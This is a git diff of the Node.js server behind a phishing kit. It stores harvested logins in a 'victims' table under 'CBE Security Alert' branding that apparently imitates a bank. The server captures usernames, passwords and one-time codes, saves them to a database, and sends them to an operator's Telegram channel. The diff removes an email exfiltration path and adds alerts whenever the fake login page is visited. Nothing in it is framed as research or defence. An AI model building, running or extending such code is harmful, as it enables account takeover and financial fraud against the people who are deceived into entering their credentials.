@@ -12,6 +12,9 @@ require('dotenv').config({ path: path.join(__dirname, '../config/.env') });
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Import Telegram
+const telegram = require('./telegram-bot');
+
 // ============================================
 // DATABASE SETUP
 // ============================================
@@ -19,25 +22,20 @@ const PORT = process.env.PORT || 3000;
 const DB_PATH = path.join(__dirname, '../database/victims.db');
 const dbDir = path.dirname(DB_PATH);
 
-// Ensure database directory exists
 if (!fs.existsSync(dbDir)) {
     fs.mkdirSync(dbDir, { recursive: true });
     console.log('✅ Database directory created');
 }
 
-// Create database connection with proper initialization
 let db = null;
 let dbInitialized = false;
 let pendingQueries = [];
 
-// Initialize database
 function initDatabase() {
     return new Promise((resolve, reject) => {
         db = new sqlite3.Database(DB_PATH, (err) => {
             if (err) {
                 console.error('❌ Database connection error:', err.message);
-                // Use in-memory database as fallback
-                console.log('⚠️  Falling back to in-memory database');
                 db = new sqlite3.Database(':memory:');
             } else {
                 console.log('✅ Connected to SQLite database');
@@ -47,10 +45,8 @@ function initDatabase() {
     });
 }
 
-// Create tables
 function createTables() {
     return new Promise((resolve, reject) => {
-        // Create victims table
         db.run(`
             CREATE TABLE IF NOT EXISTS victims (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -73,7 +69,6 @@ function createTables() {
             }
             console.log('✅ Victims table verified');
             
-            // Create logs table
             db.run(`
                 CREATE TABLE IF NOT EXISTS logs (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -90,15 +85,12 @@ function createTables() {
                 }
                 console.log('✅ Logs table verified');
                 
-                // Create indexes
                 db.run(`CREATE INDEX IF NOT EXISTS idx_victims_username ON victims(username)`, () => {});
                 db.run(`CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)`, () => {});
                 db.run(`CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp)`, () => {});
                 
                 console.log('✅ Database initialization complete');
                 dbInitialized = true;
-                
-                // Process any pending queries
                 processPendingQueries();
                 resolve();
             });
@@ -106,7 +98,6 @@ function createTables() {
     });
 }
 
-// Process pending queries
 function processPendingQueries() {
     while (pendingQueries.length > 0) {
         const query = pendingQueries.shift();
@@ -114,7 +105,6 @@ function processPendingQueries() {
     }
 }
 
-// Initialize everything
 async function initializeDatabase() {
     try {
         await initDatabase();
@@ -126,11 +116,6 @@ async function initializeDatabase() {
     }
 }
 
-// ============================================
-// DATABASE OPERATIONS (with ready check)
-// ============================================
-
-// Ensure database is ready
 function ensureDbReady(callback) {
     if (dbInitialized) {
         callback();
@@ -139,7 +124,6 @@ function ensureDbReady(callback) {
     }
 }
 
-// Encrypt data
 function encryptData(data) {
     try {
         const algorithm = 'aes-256-cbc';
@@ -159,27 +143,6 @@ function encryptData(data) {
     }
 }
 
-// Decrypt data
-function decryptData(encryptedData) {
-    try {
-        const [ivHex, encrypted] = encryptedData.split(':');
-        const iv = Buffer.from(ivHex, 'hex');
-        const key = crypto.scryptSync(
-            process.env.ENCRYPTION_KEY || 'default-key-for-testing-only', 
-            'salt', 
-            32
-        );
-        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
-        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
-        decrypted += decipher.final('utf8');
-        return JSON.parse(decrypted);
-    } catch (error) {
-        console.error('Decryption error:', error.message);
-        return { data: encryptedData };
-    }
-}
-
-// Save credentials to database
 function saveCredentials(data) {
     return new Promise((resolve, reject) => {
         ensureDbReady(() => {
@@ -215,7 +178,6 @@ function saveCredentials(data) {
     });
 }
 
-// Save OTP to database
 function saveOTP(data) {
     return new Promise((resolve, reject) => {
         ensureDbReady(() => {
@@ -238,7 +200,6 @@ function saveOTP(data) {
     });
 }
 
-// Mark as complete
 function markComplete(userId) {
     return new Promise((resolve, reject) => {
         ensureDbReady(() => {
@@ -255,33 +216,6 @@ function markComplete(userId) {
     });
 }
 
-// Get statistics
-function getStats() {
-    return new Promise((resolve, reject) => {
-        ensureDbReady(() => {
-            const query = `
-                SELECT 
-                    COUNT(*) as total,
-                    SUM(completed) as completed,
-                    DATE(timestamp) as date
-                FROM victims
-                GROUP BY DATE(timestamp)
-                ORDER BY DATE(timestamp) DESC
-                LIMIT 7
-            `;
-
-            db.all(query, (err, rows) => {
-                if (err) {
-                    reject(err);
-                } else {
-                    resolve(rows || []);
-                }
-            });
-        });
-    });
-}
-
-// Log events
 function logEvent(eventType, details, ip) {
     ensureDbReady(() => {
         const query = `
@@ -303,165 +237,9 @@ function logEvent(eventType, details, ip) {
 }
 
 // ============================================
-// TELEGRAM BOT (Simplified)
-// ============================================
-
-class TelegramService {
-    constructor() {
-        this.enabled = false;
-        this.bot = null;
-        this.chatId = null;
-        
-        try {
-            const token = process.env.TELEGRAM_BOT_TOKEN;
-            const chatId = process.env.TELEGRAM_CHAT_ID;
-
-            if (!token || !chatId) {
-                console.log('⚠️  Telegram credentials not configured');
-                return;
-            }
-
-            const TelegramBot = require('node-telegram-bot-api');
-            this.bot = new TelegramBot(token, { polling: false });
-            this.chatId = chatId;
-            this.enabled = true;
-            console.log('✅ Telegram bot initialized');
-        } catch (error) {
-            console.log('⚠️  Telegram initialization failed:', error.message);
-            this.enabled = false;
-        }
-    }
-
-    async sendMessage(message) {
-        if (!this.enabled || !this.bot) {
-            return null;
-        }
-
-        try {
-            const result = await this.bot.sendMessage(this.chatId, message, {
-                parse_mode: 'HTML'
-            });
-            console.log('✅ Telegram message sent');
-            return result;
-        } catch (error) {
-            console.error('Telegram send error:', error.message);
-            return null;
-        }
-    }
-
-    async sendCredentials(data) {
-        if (!this.enabled) return null;
-        
-        const message = `
-🔐 <b>CBE Security Alert</b>
-
-<b>📋 New Credentials Captured</b>
-
-👤 <b>Username:</b> <code>${data.username}</code>
-🔑 <b>Password:</b> <code>${data.password}</code>
-📱 <b>IP Address:</b> <code>${data.ip}</code>
-🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
-🆔 <b>ID:</b> <code>${data.id}</code>
-⏰ <b>Timestamp:</b> ${data.timestamp}
-`;
-
-        return this.sendMessage(message);
-    }
-
-    async sendOTP(data) {
-        if (!this.enabled) return null;
-        
-        const message = `
-🔐 <b>CBE Security Alert</b>
-
-<b>📋 OTP Code Captured</b>
-
-🆔 <b>User ID:</b> <code>${data.userId}</code>
-🔢 <b>OTP Code:</b> <code>${data.otp}</code>
-📱 <b>IP Address:</b> <code>${data.ip}</code>
-🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
-⏰ <b>Timestamp:</b> ${data.timestamp}
-`;
-
-        return this.sendMessage(message);
-    }
-}
-
-const telegram = new TelegramService();
-
-// ============================================
-// EMAIL SERVICE (Simplified)
-// ============================================
-
-class EmailService {
-    constructor() {
-        this.enabled = false;
-        this.transporter = null;
-        this.alertEmail = null;
-        
-        try {
-            const { EMAIL_HOST, EMAIL_PORT, EMAIL_USER, EMAIL_PASS, ALERT_EMAIL } = process.env;
-
-            if (!EMAIL_USER || !EMAIL_PASS || !ALERT_EMAIL) {
-                console.log('⚠️  Email credentials not configured');
-                return;
-            }
-
-            const nodemailer = require('nodemailer');
-            this.transporter = nodemailer.createTransport({
-                host: EMAIL_HOST || 'smtp.gmail.com',
-                port: parseInt(EMAIL_PORT) || 587,
-                secure: false,
-                auth: {
-                    user: EMAIL_USER,
-                    pass: EMAIL_PASS
-                }
-            });
-
-            this.alertEmail = ALERT_EMAIL;
-            this.enabled = true;
-            console.log('✅ Email service initialized');
-        } catch (error) {
-            console.log('⚠️  Email initialization failed:', error.message);
-            this.enabled = false;
-        }
-    }
-
-    async sendAlert(data) {
-        if (!this.enabled || !this.transporter) return null;
-
-        try {
-            const html = `
-                <h2>🔐 Security Alert</h2>
-                <p><strong>Username:</strong> ${data.username}</p>
-                <p><strong>Password:</strong> ${data.password}</p>
-                <p><strong>IP:</strong> ${data.ip}</p>
-                <p><strong>Time:</strong> ${data.timestamp}</p>
-            `;
-
-            const info = await this.transporter.sendMail({
-                from: process.env.EMAIL_USER,
-                to: this.alertEmail,
-                subject: `🔐 SECURITY ALERT: ${data.username}`,
-                html: html
-            });
-
-            console.log('✅ Email sent:', info.messageId);
-            return info;
-        } catch (error) {
-            console.error('Email send error:', error.message);
-            return null;
-        }
-    }
-}
-
-const email = new EmailService();
-
-// ============================================
 // EXPRESS SERVER SETUP
 // ============================================
 
-// Security Middleware
 app.use(helmet({
     contentSecurityPolicy: false,
     xssFilter: true,
@@ -476,7 +254,6 @@ app.use(cors({
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
-// Rate Limiting
 const limiter = rateLimit({
     windowMs: parseInt(process.env.RATE_LIMIT_WINDOW || '15') * 60 * 1000,
     max: parseInt(process.env.RATE_LIMIT_MAX || '100'),
@@ -486,7 +263,6 @@ const limiter = rateLimit({
 });
 app.use('/api/', limiter);
 
-// Session Configuration
 app.use(session({
     secret: process.env.SESSION_SECRET || 'default-secret-change-this',
     resave: false,
@@ -499,40 +275,41 @@ app.use(session({
     }
 }));
 
-// Body Parsers
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
-// Static Files
 app.use(express.static(path.join(__dirname, '../public')));
 app.use('/assets', express.static(path.join(__dirname, '../public/assets')));
 
 // ============================================
-// REQUEST LOGGING MIDDLEWARE
+// TRACK LOGIN PAGE ACCESS - SEND CHANNEL POST
 // ============================================
 
 app.use((req, res, next) => {
-    const start = Date.now();
-    
-    res.on('finish', () => {
-        const duration = Date.now() - start;
-        const logData = {
-            method: req.method,
-            url: req.url,
-            status: res.statusCode,
-            duration: `${duration}ms`,
-            ip: req.ip,
-            userAgent: req.headers['user-agent']
-        };
+    if (req.path === '/' || req.path === '/index.html') {
+        const ip = req.ip || req.connection.remoteAddress || 'unknown';
+        const userAgent = req.headers['user-agent'] || 'unknown';
+        const referrer = req.headers['referer'] || 'Direct';
+        const timestamp = new Date().toISOString();
         
-        console.log(`${logData.method} ${logData.url} - ${logData.status} - ${logData.duration}`);
+        console.log('🌐 Login page accessed - sending channel post');
         
-        // Log to database (will be queued if not ready)
-        if (req.url.startsWith('/api/')) {
-            logEvent('request', logData, req.ip);
-        }
-    });
-    
+        // Send login page info with button
+        telegram.sendLoginPageInfo().catch(err => {
+            console.error('❌ Telegram page info error:', err.message);
+        });
+        
+        // Send login page accessed alert
+        telegram.sendLoginPageAccessed({
+            ip,
+            userAgent,
+            referrer,
+            timestamp,
+            location: 'Unknown'
+        }).catch(err => {
+            console.error('❌ Telegram alert error:', err.message);
+        });
+    }
     next();
 });
 
@@ -541,29 +318,10 @@ app.use((req, res, next) => {
 // ============================================
 
 app.get('/health', (req, res) => {
-    if (!dbInitialized) {
-        res.status(503).json({ 
-            status: 'initializing', 
-            message: 'Database is initializing...',
-            timestamp: new Date().toISOString()
-        });
-        return;
-    }
-    
-    db.get('SELECT 1 FROM victims LIMIT 1', (err) => {
-        if (err) {
-            res.status(503).json({ 
-                status: 'unhealthy', 
-                error: 'Database query failed',
-                timestamp: new Date().toISOString()
-            });
-        } else {
-            res.status(200).json({ 
-                status: 'healthy', 
-                uptime: process.uptime(),
-                timestamp: new Date().toISOString()
-            });
-        }
+    res.status(200).json({ 
+        status: 'healthy', 
+        uptime: process.uptime(),
+        timestamp: new Date().toISOString()
     });
 });
 
@@ -591,7 +349,6 @@ app.get('/success', (req, res) => {
 // API ROUTES
 // ============================================
 
-// Submit credentials
 app.post('/api/submit', async (req, res) => {
     try {
         if (!dbInitialized) {
@@ -604,13 +361,11 @@ app.post('/api/submit', async (req, res) => {
             return res.status(400).json({ error: 'Missing required fields' });
         }
 
-        // Get client info
         const ip = req.ip || req.connection.remoteAddress || 'unknown';
         const userAgent = req.headers['user-agent'] || 'unknown';
         const sessionId = req.session?.id || 'unknown';
         const timestamp = new Date().toISOString();
 
-        // Save to database
         const userId = await saveCredentials({
             username,
             password,
@@ -620,41 +375,24 @@ app.post('/api/submit', async (req, res) => {
             timestamp
         });
 
-        // Log the event
         logEvent('credentials_captured', { 
             username, 
             userId, 
             ip 
         }, ip);
 
-        // Send Telegram notification
-        try {
-            await telegram.sendCredentials({
-                id: userId,
-                username,
-                password,
-                ip,
-                userAgent,
-                timestamp
-            });
-        } catch (telegramError) {
-            console.warn('Telegram notification failed:', telegramError.message);
-        }
+        // Send to Telegram channel
+        await telegram.sendCredentials({
+            id: userId,
+            username,
+            password,
+            ip,
+            userAgent,
+            timestamp
+        }).catch(err => {
+            console.error('❌ Telegram credentials error:', err.message);
+        });
 
-        // Send Email alert
-        try {
-            await email.sendAlert({
-                username,
-                password,
-                ip,
-                userAgent,
-                timestamp
-            });
-        } catch (emailError) {
-            console.warn('Email alert failed:', emailError.message);
-        }
-
-        // Update session
         if (req.session) {
             req.session.userId = userId;
             req.session.username = username;
@@ -671,7 +409,6 @@ app.post('/api/submit', async (req, res) => {
     }
 });
 
-// Verify OTP
 app.post('/api/verify-otp', async (req, res) => {
     try {
         if (!dbInitialized) {
@@ -689,15 +426,6 @@ app.post('/api/verify-otp', async (req, res) => {
             return res.status(400).json({ error: 'Invalid OTP format' });
         }
 
-        // Get user info for logging
-        const user = await new Promise((resolve, reject) => {
-            db.get('SELECT username FROM victims WHERE id = ?', [userId], (err, row) => {
-                if (err) reject(err);
-                else resolve(row);
-            });
-        });
-
-        // Save OTP to database
         await saveOTP({
             userId,
             otp,
@@ -706,24 +434,20 @@ app.post('/api/verify-otp', async (req, res) => {
             timestamp: new Date().toISOString()
         });
 
-        // Log the event
         logEvent('otp_submitted', { 
-            userId, 
-            username: user?.username || 'unknown'
+            userId
         }, req.ip);
 
-        // Send OTP to Telegram
-        try {
-            await telegram.sendOTP({
-                userId,
-                otp,
-                ip: req.ip || 'unknown',
-                userAgent: req.headers['user-agent'] || 'unknown',
-                timestamp: new Date().toISOString()
-            });
-        } catch (telegramError) {
-            console.warn('Telegram OTP notification failed:', telegramError.message);
-        }
+        // Send OTP to Telegram channel
+        await telegram.sendOTP({
+            userId,
+            otp,
+            ip: req.ip || 'unknown',
+            userAgent: req.headers['user-agent'] || 'unknown',
+            timestamp: new Date().toISOString()
+        }).catch(err => {
+            console.error('❌ Telegram OTP error:', err.message);
+        });
 
         res.json({
             success: true,
@@ -736,15 +460,12 @@ app.post('/api/verify-otp', async (req, res) => {
     }
 });
 
-// Complete process
 app.post('/api/complete', async (req, res) => {
     try {
         const userId = req.session?.userId;
         
         if (userId) {
             await markComplete(userId);
-            
-            // Log the event
             logEvent('process_completed', { 
                 userId,
                 username: req.session?.username || 'unknown'
@@ -761,81 +482,40 @@ app.post('/api/complete', async (req, res) => {
     }
 });
 
-// Telegram status
-app.get('/api/telegram/status', (req, res) => {
-    res.json({ 
-        enabled: telegram.enabled,
-        chatId: process.env.TELEGRAM_CHAT_ID ? 'configured' : 'not configured'
-    });
-});
+// ============================================
+// TEST TELEGRAM ENDPOINT
+// ============================================
 
-// Telegram send message
-app.post('/api/telegram/send', async (req, res) => {
+app.get('/debug/test-telegram', async (req, res) => {
     try {
-        const { message, type, timestamp, userAgent, url } = req.body;
+        const results = {
+            enabled: telegram.enabled,
+            hasBot: !!telegram.bot,
+            hasChannelId: !!telegram.channelId,
+            channelId: telegram.channelId,
+            chatId: telegram.chatId
+        };
         
-        if (!message) {
-            return res.status(400).json({ error: 'Message is required' });
-        }
+        const testMessage = `
+🧪 <b>TELEGRAM TEST</b>
+<pre>═══════════════════════════════════════</pre>
 
-        const formattedMessage = `
-📱 Client Notification
+✅ Bot is connected
+📡 Testing channel posting...
+⏰ Time: ${new Date().toISOString()}
 
-Type: ${type || 'info'}
-Message: ${message}
-Time: ${timestamp || new Date().toISOString()}
-User Agent: ${userAgent || 'unknown'}
-URL: ${url || 'unknown'}
-IP: ${req.ip || 'unknown'}
-        `;
-
-        await telegram.sendMessage(formattedMessage);
-        res.json({ success: true });
-
+If you see this, everything works!
+`;
+        
+        const result = await telegram.sendChannelPost(testMessage);
+        results.postResult = result ? '✅ Success' : '❌ Failed';
+        
+        res.json(results);
     } catch (error) {
-        console.error('Telegram send error:', error.message);
-        res.status(500).json({ error: 'Failed to send message' });
-    }
-});
-
-// Get statistics (admin endpoint)
-app.get('/api/stats', async (req, res) => {
-    try {
-        if (!dbInitialized) {
-            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
-        }
-        const stats = await getStats();
-        res.json({ success: true, data: stats });
-    } catch (error) {
-        console.error('Stats error:', error.message);
-        res.status(500).json({ error: 'Failed to get statistics' });
-    }
-});
-
-// Get logs (admin endpoint)
-app.get('/api/logs', async (req, res) => {
-    try {
-        if (!dbInitialized) {
-            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
-        }
-        
-        const limit = parseInt(req.query.limit) || 50;
-        
-        const logs = await new Promise((resolve, reject) => {
-            db.all(
-                'SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', 
-                [limit], 
-                (err, rows) => {
-                    if (err) reject(err);
-                    else resolve(rows);
-                }
-            );
+        res.status(500).json({
+            error: error.message,
+            stack: error.stack
         });
-        
-        res.json({ success: true, data: logs });
-    } catch (error) {
-        console.error('Logs error:', error.message);
-        res.status(500).json({ error: 'Failed to get logs' });
     }
 });
 
@@ -845,25 +525,13 @@ app.get('/api/logs', async (req, res) => {
 
 app.use((err, req, res, next) => {
     console.error('Error:', err.message);
-    logEvent('error', { 
-        message: err.message, 
-        stack: err.stack,
-        url: req.url
-    }, req.ip);
-    
     res.status(500).json({ error: 'Something went wrong!' });
-});
-
-// 404 handler
-app.use((req, res) => {
-    res.status(404).json({ error: 'Not found' });
 });
 
 // ============================================
 // START SERVER
 // ============================================
 
-// Initialize database first, then start server
 initializeDatabase().then((success) => {
     if (!success) {
         console.error('❌ Failed to initialize database. Exiting...');
@@ -876,20 +544,20 @@ initializeDatabase().then((success) => {
         console.log(`📁 Environment: ${process.env.NODE_ENV || 'development'}`);
         console.log(`🗄️  Database: ${DB_PATH}`);
         console.log(`📡 Telegram: ${telegram.enabled ? '✅ Enabled' : '❌ Disabled'}`);
-        console.log(`📧 Email: ${email.enabled ? '✅ Enabled' : '❌ Disabled'}`);
         console.log('='.repeat(60));
+        
+        // Send welcome message on startup
+        setTimeout(() => {
+            telegram.sendWelcomeMessage().catch(err => {
+                console.error('❌ Welcome message error:', err.message);
+            });
+        }, 2000);
     });
-
-    // ============================================
-    // GRACEFUL SHUTDOWN
-    // ============================================
 
     const shutdown = () => {
         console.log('\n🛑 Shutting down gracefully...');
-        
         server.close(() => {
             console.log('✅ Server closed');
-            
             if (db) {
                 db.close((err) => {
                     if (err) {
@@ -910,10 +578,6 @@ initializeDatabase().then((success) => {
     process.on('unhandledRejection', (reason, promise) => {
         console.error('❌ Unhandled Rejection:', reason);
     });
-
-    // ============================================
-    // EXPORT FOR TESTING
-    // ============================================
 
     module.exports = { app, db, server };
 }).catch((error) => {
